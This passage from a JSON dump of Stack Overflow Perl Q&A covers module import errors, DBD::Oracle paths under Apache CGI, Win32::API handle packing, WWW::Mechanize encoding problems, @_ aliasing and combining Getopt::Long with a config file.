"https://stackoverflow.com/questions/35258993/perl-universal-does-not-export-anything/35259262#35259262", "title": "perl - UNIVERSAL does not export anything", "body": "<p>From the documentation of <a href=\"https://metacpan.org/pod/UNIVERSAL\" rel=\"nofollow\">Universal</a>:</p>\n\n<blockquote>\n  <p>Previous versions of this documentation suggested using isa as a function to determine the type of a reference:</p>\n</blockquote>\n\n<pre><code>use UNIVERSAL 'isa';\n\n$yes = isa $h, \"HASH\";\n$yes = isa \"Foo\", \"Bar\";\n</code></pre>\n\n<blockquote>\n  <p>The problem is that this code would never call an overridden isa method in any class. Instead, use reftype from Scalar::Util for the first case:</p>\n</blockquote>\n\n<pre><code>use Scalar::Util 'reftype';\n\n$yes = reftype( $h ) eq \"HASH\";\n</code></pre>\n\n<p>So this method does not exist anymore.</p>\n"}], "owner": {"reputation": 7292, "user_id": 1268941, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/d27dc0d604e075ad3281aeb013a419c7?s=128&d=identicon&r=PG&f=1", "display_name": "brucezepplin", "link": "https://stackoverflow.com/users/1268941/brucezepplin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1421, "favorite_count": 0, "accepted_answer_id": 35259262, "answer_count": 2, "score": 3, "last_activity_date": 1454880093, "creation_date": 1454878343, "question_id": 35258993, "link": "https://stackoverflow.com/questions/35258993/perl-universal-does-not-export-anything", "title": "perl - UNIVERSAL does not export anything", "body": "<p>Hi I am getting the following error when trying to run a perl script:</p>\n\n<pre><code>pc:~/Phd/lenovo/programs/vep/scripts/variant_effect_predictor$ perl variant_effect_predictor.pl --help\nUNIVERSAL does not export anything at /home/arron/Phd/lenovo/programs/vep/scripts/variant_effect_predictor/Bio/Tree/TreeFunctionsI.pm line 94.\n</code></pre>\n\n<p>where the offending line is:</p>\n\n<pre><code>use UNIVERSAL qw(isa)\n</code></pre>\n\n<p>what is the issue?</p>\n"}, {"tags": ["perl", "dancer"], "owner": {"reputation": 31, "user_id": 2633886, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001127131070/picture?type=large", "display_name": "Kim Evgeniy", "link": "https://stackoverflow.com/users/2633886/kim-evgeniy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 43, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1454873997, "creation_date": 1454873997, "question_id": 35258158, "link": "https://stackoverflow.com/questions/35258158/how-can-i-catch-forrm-name-in-dancer2", "title": "How can I catch forrm name in Dancer2", "body": "<p>I try to use Dancer2 framework for create my site. And in some routes I need to get form name which submited. In perldoc Dancer2::Manual I can't find how can I do it. Anybody point me please</p>\n"}, {"tags": ["oracle", "perl", "installation", "perl-module", "dbd"], "comments": [{"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "edited": false, "score": 0, "creation_date": 1454880567, "post_id": 35258040, "comment_id": 58231091, "body": "How did you install?"}, {"owner": {"reputation": 2453, "user_id": 2490439, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ewU3d.jpg?s=128&g=1", "display_name": "pkm", "link": "https://stackoverflow.com/users/2490439/pkm"}, "reply_to_user": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "edited": false, "score": 0, "creation_date": 1454996327, "post_id": 35258040, "comment_id": 58280132, "body": "installed oracle client, DBI then set paths and then DBD::Oracle ......did i missed something ......do u have specific guidelines"}, {"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "edited": false, "score": 0, "creation_date": 1455006070, "post_id": 35258040, "comment_id": 58284308, "body": "I just thought that you created the DBD::Oracle and copied it to this machine. Can you check if this works by addind <code>use lib &#39;&#47;home&#47;x&#47;perl5&#47;lib&#47;perl5&#47;x86_64-linux-thread-multi&#47;DBD&#47;auto&#39;</code> to the top of your script?"}, {"owner": {"reputation": 2453, "user_id": 2490439, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ewU3d.jpg?s=128&g=1", "display_name": "pkm", "link": "https://stackoverflow.com/users/2490439/pkm"}, "reply_to_user": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "edited": false, "score": 0, "creation_date": 1455009534, "post_id": 35258040, "comment_id": 58286283, "body": "already that in PATH but no luck"}, {"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "edited": false, "score": 0, "creation_date": 1455014180, "post_id": 35258040, "comment_id": 58289403, "body": "<code>&#47;home&#47;x&#47;perl5&#47;lib&#47;perl5&#47;x86_64-linux-thread-multi&#47;auto</code> and <code>&#47;home&#47;x&#47;perl5&#47;lib&#47;perl5&#47;x86_64-linux-thread-multi&#47;DBD&#47;auto</code> are different."}], "answers": [{"comments": [{"owner": {"reputation": 2453, "user_id": 2490439, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ewU3d.jpg?s=128&g=1", "display_name": "pkm", "link": "https://stackoverflow.com/users/2490439/pkm"}, "edited": false, "score": 0, "creation_date": 1454996249, "post_id": 35259352, "comment_id": 58280108, "body": "???? Its installed on its own .....i didn&#39;t added....well what could be right fix ?"}], "tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": false, "score": 0, "last_activity_date": 1454880615, "creation_date": 1454880615, "answer_id": 35259352, "question_id": 35258040, "link": "https://stackoverflow.com/questions/35258040/cant-locate-dbd-oracle-pm/35259352#35259352", "title": "Can&#39;t locate DBD/Oracle.pm", "body": "<p>Look here: <code>/home/x/perl5/lib/perl5/x86_64-linux-thread-multi/DBD/auto</code>, compared to this: <code>/home/x/perl5/lib/perl5/x86_64-linux-thread-multi/auto</code>. Looks like you added an extra <code>DBD</code> in the directory when you installed the module.</p>\n"}], "owner": {"reputation": 2453, "user_id": 2490439, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ewU3d.jpg?s=128&g=1", "display_name": "pkm", "link": "https://stackoverflow.com/users/2490439/pkm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 3650, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454914539, "creation_date": 1454873357, "last_edit_date": 1454914539, "question_id": 35258040, "link": "https://stackoverflow.com/questions/35258040/cant-locate-dbd-oracle-pm", "title": "Can&#39;t locate DBD/Oracle.pm", "body": "<pre><code>[Sun Feb 07 14:21:13.653134 2016]\n[cgi:error] [pid 5059] [client 192.168.2.1:58208]\nAH01215: Can't locate DBD/Oracle.pm in @INC (@INC contains:   \n   /home/x/perl5/lib/perl5/x86_64-linux-thread-multi/\n   /home/x/perl5/lib/perl5/x86_64-linux-thread-multi/auto\n   lib /wm/libs\n       /usr/local/lib64/perl5 /usr/local/share/perl5  \n       /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl\n       /usr/lib64/perl5 /usr/share/perl5\n.) at /kk/kk/kk/DB.pm line 27.\n</code></pre>\n\n<p>I have install DBD::Oracle below is the directory structure</p>\n\n<pre><code>[x@ip-192-168-1-2 DBD-Oracle-1.74]$ tree /home/x/perl5/lib/perl5/x86_64-linux-thread-multi/DBD/auto\n\u251c\u2500\u2500 auto\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 DBD\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Oracle\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 dbdimp.h\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 mk.pm\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 ocitrace.h\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Oracle.h\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 Oracle.so\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 Oracle.pm\n</code></pre>\n\n<p>Also i have a sample script to test whether its actually works, and guess what this script works fine </p>\n\n<pre><code>[x@ip-192-168-1-2 Util]$ cat test.pl\n#!/usr/bin/perl\nuse DBD::Oracle;\nuse DBD::Oracle qw(ORA_RSET);\n</code></pre>\n\n<p>But when try running DBD::Oracle module from one of the .pm through cgi on apache its gives top error.Unable to figure out exact error .</p>\n\n<p>Alos Oracle client is installed ORACLE_HOME and LD_LIBRARY_PATH is set.</p>\n"}, {"tags": ["perl", "winapi", "pack"], "answers": [{"tags": [], "owner": {"reputation": 1268, "user_id": 656480, "user_type": "registered", "accept_rate": 33, "profile_image": "https://i.stack.imgur.com/VVs32.jpg?s=128&g=1", "display_name": "Cozzamara", "link": "https://stackoverflow.com/users/656480/cozzamara"}, "is_accepted": false, "score": 2, "last_activity_date": 1454900043, "last_edit_date": 1454900043, "creation_date": 1454879370, "answer_id": 35259129, "question_id": 35257587, "link": "https://stackoverflow.com/questions/35257587/unable-to-pass-packed-array-of-handles-to-win32api-call-in-perl/35259129#35259129", "title": "Unable to pass packed array of handles to Win32::API call in Perl", "body": "<p>The problem is 64 bits. On 64-bit Windows (and in 64-bit Perl), sizeof(HANDLE) = 8 bytes. So if the program runs in 64-bit Perl, it loads 64-bit DLLs, and you have to pack handles using <code>Q</code> (i.e. 64-bit integers). Using <code>L</code> won't work because it packs 32-bit ints. The following fixes the problem: </p>\n\n<pre><code>use Config qw( %Config );\n\nmy $ptr_size = $Config{ptrsize};\nmy $ptr_format =\n   $ptr_size == 4 ? \"L\" :\n   $ptr_size == 8 ? \"Q\" :\n   die(\"Unsupported pointer size $ptr_size\\n\");\n\nmy $handlePack = pack $ptr_format.\"*\", @handles; \n\n$rc = $WaitForMultipleObjects-&gt;Call($n, $handlePack, 0, 0xffffffff);\n</code></pre>\n\n<p>Note that even in 64-bit Perl, <code>pack('I')</code> can still produce 32 bits (depending on the compiler). <code>pack('J')</code> (Perl's internal int) is also unsuitable because while it's at least as large as a pointer, it could be larger (e.g. a 32-bit Perl built using <code>-Duse64bitint</code>).</p>\n"}], "owner": {"reputation": 1268, "user_id": 656480, "user_type": "registered", "accept_rate": 33, "profile_image": "https://i.stack.imgur.com/VVs32.jpg?s=128&g=1", "display_name": "Cozzamara", "link": "https://stackoverflow.com/users/656480/cozzamara"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 147, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1454901489, "creation_date": 1454870920, "last_edit_date": 1454901489, "question_id": 35257587, "link": "https://stackoverflow.com/questions/35257587/unable-to-pass-packed-array-of-handles-to-win32api-call-in-perl", "title": "Unable to pass packed array of handles to Win32::API call in Perl", "body": "<p>I am trying to call Win32 API function from Perl using Win32::API, and pass it array of handles. The particular function is <code>WaitForMultipleObjects</code> and it doesn't like the way I feed parameters to it. Here's how it's defined in Perl:</p>\n\n<pre><code> # DWORD WaitForMultipleObjects(DWORD nCount, HANDLE* handles, BOOL, DWORD)\n $WaitForMultipleObjects = new Win32::API::More('kernel32',\n                                                'WaitForMultipleObjects', 'NPNN', 'N');\n</code></pre>\n\n<p>Then there's array of handles. All of them are confirmed valid and they all work when passed individually to <code>WaitForSingleObject</code>. \nHere's how I pack the parameters: </p>\n\n<pre><code>   my @handles; \n   ...\n   my $n = scalar(@handles);\n   my $handlePack = pack \"L*\", @handles; # also tried 'L1', 'L2', etc.\n   $rc = $WaitForMultipleObjects-&gt;Call($n, $handlePack, 0, 0xffffffff); # fails\n</code></pre>\n\n<p>This fails and GetLastError() reports error 6 (The handle is invalid). \nHowever, if I pass only one handle, it works: </p>\n\n<pre><code>   my $handlePack = pack \"L\", $handles[0];\n   $rc = $WaitForMultipleObjects-&gt;Call(1, $handlePack, 0, 0xffffffff); # works\n</code></pre>\n\n<p>Obviously Win32::API is not able to pass the array of handles correctly in the second parameter, but as far as I understand the documentation (<a href=\"https://metacpan.org/pod/Win32::API\" rel=\"nofollow\">https://metacpan.org/pod/Win32::API</a>), that's how it should be. Or is my usage of <code>pack()</code> wrong ? I am on 64-bit Perl, if that matters. </p>\n"}, {"tags": ["perl", "web", "mechanize", "www-mechanize"], "answers": [{"comments": [{"owner": {"reputation": 1175, "user_id": 1933657, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/DLTyD.png?s=128&g=1", "display_name": "KingsInnerSoul", "link": "https://stackoverflow.com/users/1933657/kingsinnersoul"}, "edited": false, "score": 0, "creation_date": 1454868970, "post_id": 35257138, "comment_id": 58226712, "body": "I am getting this error: <code>Can&#39;t locate object method &quot;decoded_content&quot; via package &quot;WWW::Mechanize&quot; at script.pl line 75.</code>"}, {"owner": {"reputation": 1175, "user_id": 1933657, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/DLTyD.png?s=128&g=1", "display_name": "KingsInnerSoul", "link": "https://stackoverflow.com/users/1933657/kingsinnersoul"}, "edited": false, "score": 0, "creation_date": 1454870015, "post_id": 35257138, "comment_id": 58227156, "body": "I figured it out, I was missing <code>WWW::Mechanize::DecodedContent</code>. Once that was fixed the code worked. But I am still getting the same issue. For another example, I am getting <code>e&#226;\u20ac&#166;</code> instead of <code>...</code>"}, {"owner": {"reputation": 1175, "user_id": 1933657, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/DLTyD.png?s=128&g=1", "display_name": "KingsInnerSoul", "link": "https://stackoverflow.com/users/1933657/kingsinnersoul"}, "edited": false, "score": 0, "creation_date": 1454871408, "post_id": 35257138, "comment_id": 58227649, "body": "OK, I had to moduify your answer to: <code>$m-&gt;decoded_content(charset =&gt; &#39;utf8&#39;);</code>"}, {"owner": {"reputation": 59411, "user_id": 8355, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d0099a2574719d7a67eab012851bf9b?s=128&d=identicon&r=PG", "display_name": "cjm", "link": "https://stackoverflow.com/users/8355/cjm"}, "reply_to_user": {"reputation": 1175, "user_id": 1933657, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/DLTyD.png?s=128&g=1", "display_name": "KingsInnerSoul", "link": "https://stackoverflow.com/users/1933657/kingsinnersoul"}, "edited": false, "score": 0, "creation_date": 1454871539, "post_id": 35257138, "comment_id": 58227702, "body": "It sounds like the website you&#39;re trying to scrape is not properly reporting the character set it&#39;s using."}, {"owner": {"reputation": 1175, "user_id": 1933657, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/DLTyD.png?s=128&g=1", "display_name": "KingsInnerSoul", "link": "https://stackoverflow.com/users/1933657/kingsinnersoul"}, "edited": false, "score": 0, "creation_date": 1454970737, "post_id": 35257138, "comment_id": 58272732, "body": "Well, I tested it on StackOverflow and it is the same result. <a href=\"http://stackoverflow.com/questions/35279605/qt-open-libqtcore-so-4-o-rdonlyo-cloexec-1-enoent-no-such-file-or-di\" title=\"qt open libqtcore so 4 o rdonlyo cloexec 1 enoent no such file or di\">stackoverflow.com/questions/35279605/&hellip;</a> . For <code>\u201c..libQtCore.so.4\u201d</code> I am getting <code>&#226;\u20ac\u0153..libQtCore.so.4&#226;\u20ac</code>"}], "tags": [], "owner": {"reputation": 59411, "user_id": 8355, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d0099a2574719d7a67eab012851bf9b?s=128&d=identicon&r=PG", "display_name": "cjm", "link": "https://stackoverflow.com/users/8355/cjm"}, "is_accepted": false, "score": 2, "last_activity_date": 1454868689, "creation_date": 1454868689, "answer_id": 35257138, "question_id": 35257053, "link": "https://stackoverflow.com/questions/35257053/perl-wwwmechanize-encoding-issue/35257138#35257138", "title": "Perl WWW::Mechanize encoding issue", "body": "<p>Use</p>\n\n<pre><code>$m-&gt;decoded_content;\n</code></pre>\n\n<p>instead of</p>\n\n<pre><code>$m-&gt;content;\n</code></pre>\n"}], "owner": {"reputation": 1175, "user_id": 1933657, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/DLTyD.png?s=128&g=1", "display_name": "KingsInnerSoul", "link": "https://stackoverflow.com/users/1933657/kingsinnersoul"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 172, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454868689, "creation_date": 1454868267, "question_id": 35257053, "link": "https://stackoverflow.com/questions/35257053/perl-wwwmechanize-encoding-issue", "title": "Perl WWW::Mechanize encoding issue", "body": "<p>I have the following code: </p>\n\n<pre><code>my ($url) = \"http://example.com\"\nmy $m = WWW::Mechanize-&gt;new();\n$m-&gt;get($url);\nmy $c = $m-&gt;content;\nmy $tree = HTML::TreeBuilder::XPath-&gt;new_from_content( $c );\n\nif (my $content = $tree-&gt;look_down(_tag =&gt; \"div\", class =&gt; \"content\")) {\n    $content = $content-&gt;as_text();\n}\n</code></pre>\n\n<p>The issue is, when I parse the content, some of the text has a single or double quotes that do  not get parsed correctly. For example <code>\u201cthis\u201d</code> becomes <code>\u00e2\u20ac\u0153this\u00e2\u20ac</code> .</p>\n\n<p>It is my understanding that this is some <code>Windows-1252</code> encoding. How can I fix it?</p>\n\n<p>I tried adding <code>binmode STDOUT, ':encoding(utf-8)';</code> at the start of the program, it did not help. </p>\n\n<p>I tried adding <code>$content = utf8::decode($content);</code> but it did not help. </p>\n"}, {"tags": ["perl", "reference"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454856907, "post_id": 35254830, "comment_id": 58222362, "body": "I have no idea what &quot;out parameters&quot; means but I&#39;ve edited your question to reflect what I think you&#39;re trying to ask. Feel free to rollback/edit if I guessed wrong."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454860149, "post_id": 35254952, "comment_id": 58223466, "body": "I like this answer, but I&#39;m not sure how much value your <i>Alternatively</i> gives. It&#39;s never specifically guaranteed that <code>\\$_[0]</code>will be identical to a reference to the calling parameter, but that&#39;s mainly because <i>\u201caliases\u201d</i> is never properly defined. I also think it&#39;s confusing to pass <code>my $x</code> as a parameter, as that could be seen as part of the mechanism; that&#39;s why I&#39;ve separated the two in your first example. It&#39;s also probably worth mentioning that <code>a(99)</code> will raise an appropriate error because you would be attempting to modify a Perl literal"}], "tags": [], "owner": {"reputation": 30739, "user_id": 1804599, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/v91P3.jpg?s=128&g=1", "display_name": "rightfold", "link": "https://stackoverflow.com/users/1804599/rightfold"}, "is_accepted": true, "score": 3, "last_activity_date": 1454859744, "last_edit_date": 1454859744, "creation_date": 1454856726, "answer_id": 35254952, "question_id": 35254830, "link": "https://stackoverflow.com/questions/35254830/how-can-i-allow-lexical-variable-declarations-in-my-subroutine-arguments-the-way/35254952#35254952", "title": "How can I allow lexical variable declarations in my subroutine arguments the way opendir does?", "body": "<p>According to <a href=\"http://perldoc.perl.org/perlsub.html#DESCRIPTION\" rel=\"nofollow\">perlsub</a>:</p>\n\n<blockquote>\n  <p>Any arguments passed in show up in the array <code>@_</code>. Therefore, if you called a function with two arguments, those would be stored in <code>$_[0]</code> and <code>$_[1]</code>. The array <code>@_</code> is a local array, but its elements are aliases for the actual scalar parameters. In particular, if an element <code>$_[0]</code> is updated, the corresponding argument is updated (or an error occurs if it is not updatable).</p>\n</blockquote>\n\n<p>In other words, assignments to elements of <code>@_</code> will be made to the actual parameters of the call</p>\n\n<pre><code>sub a {\n    $_[0] = 100;\n}\n\nmy $x;\na($x);\nprint \"$x\\n\"; # =&gt; 100\n</code></pre>\n\n<p>Alternatively:</p>\n\n<pre><code>sub a {\n    my $x = \\$_[0];\n    $$x = 100;\n}\n\na(my $x);\nprint \"$x\\n\"; # =&gt; 100\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1467625176, "last_edit_date": 1467625176, "creation_date": 1454862767, "answer_id": 35256053, "question_id": 35254830, "link": "https://stackoverflow.com/questions/35254830/how-can-i-allow-lexical-variable-declarations-in-my-subroutine-arguments-the-way/35256053#35256053", "title": "How can I allow lexical variable declarations in my subroutine arguments the way opendir does?", "body": "<p>Here's an example that may help. Note that it doesn't make any checks on the open mode and just makes naive guesses. If you need something like this, you then you should really <a href=\"http://perldoc.perl.org/autodie.html\" rel=\"nofollow\"><code>use autodie</code></a> on version 10.1 or later of Perl 5</p>\n\n<p>The part relevant to your question is that the line</p>\n\n<pre><code>my ($mode, $file) = @_[1,2]\n</code></pre>\n\n<p>pulls the second and third <em>input</em> parameters out for local use. The subroutine opens the passed-in file path and mode to open the file using a lexical file handle, and then returns that file handle by assigning to the first parameter with the line</p>\n\n<pre><code>$_[0] = $fh;\n</code></pre>\n\n<p><br/></p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy_open(my $fh, '&lt;&lt;', 'xyzzy');\n\nsub my_open {\n\n    my ($mode, $file) = @_[1,2]\n\n    my $modestring = $mode =~ /&gt;&gt;/ ? 'append' : $mode =~ /&gt;/ ? 'write' : 'read';\n\n    open my $fh, $mode, $file or die qq{Unable to open \"$file\" for $modestring: $!};\n\n    $_[0] = $fh;\n}\n</code></pre>\n"}], "owner": {"reputation": 3510, "user_id": 1551863, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c618edf997d42a69f74df293506ea4ed?s=128&d=identicon&r=PG", "display_name": "George Simms", "link": "https://stackoverflow.com/users/1551863/george-simms"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 1, "accepted_answer_id": 35254952, "answer_count": 2, "score": 2, "last_activity_date": 1467625176, "creation_date": 1454856095, "last_edit_date": 1454856835, "question_id": 35254830, "link": "https://stackoverflow.com/questions/35254830/how-can-i-allow-lexical-variable-declarations-in-my-subroutine-arguments-the-way", "title": "How can I allow lexical variable declarations in my subroutine arguments the way opendir does?", "body": "<p>Some Perl functions allow you to pass lexical variables declared in the argument list:</p>\n\n<pre><code>opendir(my $h, '.') or die $!;\n</code></pre>\n\n<p>What exactly is going on here? I can simulate similar behavior using references:</p>\n\n<pre><code>sub a {\n    my ($ref) = @_;\n    $$ref = 100;\n}\n\nmy $value;\na(\\$value);\nSTDOUT-&gt;say($value); # =&gt; 100\n</code></pre>\n\n<p>But it doesn't quite work like <code>opendir</code>, because I need to wrap the scalar in a reference:</p>\n\n<pre><code>a(my $value);\nSTDOUT-&gt;say($value); # =&gt; nothing\n</code></pre>\n\n<p>Is it possible to reproduce the behavior of <code>opendir</code> here?</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 93, "user_id": 2334574, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DD11P.jpg?s=128&g=1", "display_name": "Dave Baird", "link": "https://stackoverflow.com/users/2334574/dave-baird"}, "edited": false, "score": 0, "creation_date": 1455524235, "post_id": 35388604, "comment_id": 58510075, "body": "Ah, very nice! The use case here is a configuration script running during initial setup of a server, hence the preference for core-only. Cheers!"}], "tags": [], "owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "is_accepted": true, "score": 1, "last_activity_date": 1455426861, "creation_date": 1455426861, "answer_id": 35388604, "question_id": 35254565, "link": "https://stackoverflow.com/questions/35254565/how-to-elegantly-combine-getoptlong-with-a-config-file-when-the-config-file-ca/35388604#35388604", "title": "How to elegantly combine Getopt::Long with a config file when the config file can be specified on the command line", "body": "<p>Rule 5 complicates things...\nHowever, modules loaded via -M on the command line are loaded before modules mentioned in your script - including Getopt::Long.  Therefore, we can rig something up where the default config is stored in a short, custom module;</p>\n\n<pre><code># DefaultConf.pm\nuse strict;\nuse warnings;\n\nwhile (&lt;DATA&gt;) {\n    chomp ;                              # Remove the newline\n    s/ \\s* \\#.* //x ;                    # Strip comments\n    next if / ^ \\s* $ /x ;               # Ignore blank lines\n    my @a = split(\" \", $_, 2);           # Break into 2 pieces and unshift\n    unshift(@ARGV, $_) for reverse @a ;  # onto ARGV in reverse order\n}\n\n# print \"===\\n\", join(\" \", @ARGV), \"\\n\", \"===\\n\";  # debug\n\n1;\n__DATA__\n\n# Default App  config data here\n--verbose\n-n  # single old-style switch with comment\n\n# another comment\n--files file1.txt, file2.txt\n</code></pre>\n\n<p>Text after <code>__DATA__</code> is ignored by perl but is available to the programmer via the <code>DATA</code> filehandle.  Here we can store our default config for the script with one restriction - only one option (with arguments) per line.  Comments can be used either on the end of an option specification or for a whole line using the perl comment character, '#'. </p>\n\n<p>This is used from the command line like so:</p>\n\n<pre><code>perl -MDefaultConf my_app.pl --verbose=0 --files file12.txt --log\n</code></pre>\n\n<p><code>my_app.pl</code> loads <code>Getopt::Long</code> as normal but as our custom module is loaded via -M on the command line, it is loaded <strong>first.</strong> As a result, we can fiddle with <code>@ARGV</code> before <code>Getopt::Long</code> gets its greedy little hands on it.  Thereafter, the actual option processing is done by <code>Getopt::Long</code>, so the option syntax at the end of our custom module is exactly the same.</p>\n\n<p>Hopefully the inline comments make the code self explanatory - the only trickery is when there are two \"pieces\" (say, an option and its single argument), we need to push them onto the <strong>front</strong> of @ARGV (unshift - not push) in <strong>reverse</strong> order so that  if the same option is mentioned on the command line, it is processed latter and therefore takes precedence.</p>\n\n<p>Using this method you could have numerous config files for different \"run situations\" selected via the -M option or, as requested, you can run without any of them using CLI for options, or a combination where the CLI options take precedence.</p>\n\n<p>One final comment about rule 5 - only core modules.  Because of this restriction, you have to use this (or similar) module - which is <strong>NOT</strong> a core module.  And although its small and easy to understand, it has no tests and it hasn't been deployed in hundreds of places as say, <code>Config::Tiny</code> has.  <code>Config::Tiny</code> is under 100 lines long (excluding blanks and comments) and can be fully understood in about an hour.  Of course, everyone's environment and constraints are different - it's just something to consider.</p>\n"}], "owner": {"reputation": 93, "user_id": 2334574, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DD11P.jpg?s=128&g=1", "display_name": "Dave Baird", "link": "https://stackoverflow.com/users/2334574/dave-baird"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "accepted_answer_id": 35388604, "answer_count": 1, "score": 1, "last_activity_date": 1455426861, "creation_date": 1454854545, "question_id": 35254565, "link": "https://stackoverflow.com/questions/35254565/how-to-elegantly-combine-getoptlong-with-a-config-file-when-the-config-file-ca", "title": "How to elegantly combine Getopt::Long with a config file when the config file can be specified on the command line", "body": "<p>I want to process script options with these rules:</p>\n\n<ol>\n<li>Options can be provided on the command line or in a config file or both</li>\n<li>Command line processing is done with Getopt::Long</li>\n<li>Options on the command line take precedence over those in the config file</li>\n<li>The config file can be specified on the command line</li>\n<li>Ideally, only using core modules</li>\n</ol>\n\n<p>Without requirement 4, I can just process the config file first, then the command line, allowing the later options to overwrite the earlier. Elegant. </p>\n\n<p>But if the config file is specified on the command line, I need to throw it all away and start again, which makes everything suddenly messy and complicated. </p>\n\n<p>Is there an elegant perl idiom for this? </p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": 